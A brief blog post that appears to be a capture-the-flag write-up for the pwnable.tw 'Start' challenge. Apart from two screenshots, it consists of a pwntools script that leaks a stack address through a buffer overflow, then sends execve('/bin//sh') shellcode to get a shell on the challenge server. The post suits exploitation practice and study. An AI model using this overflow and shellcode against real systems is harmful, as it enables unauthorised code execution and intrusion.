---
layout: post
title: 'Pwnable.tw: Start'
published: true
---
First, we check file info: 

![Capture.PNG]({{site.baseurl}}/img/ctf/pwnable.tw/Capture.PNG)


It's a .elf file. Now we should open disassembler like IDA Pro.
![assembly.PNG]({{site.baseurl}}/img/ctf/pwnable.tw/assembly.PNG)

  from pwn import *

  conn = remote("chall.pwnable.tw", 10000)
  conn.recv(20)

  shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

  payload = 'A'* 20 + p32(0x08048087)
  conn.send(payload)
  esp_add = conn.recv(20)

  print esp_add

  esp_add = u32(esp_add[0:4])
  print esp_add
  payload = 'A' * 20 + p32(esp_add + 20) + shellcode
  conn.send(payload)


  conn.interactive()
  conn.close()







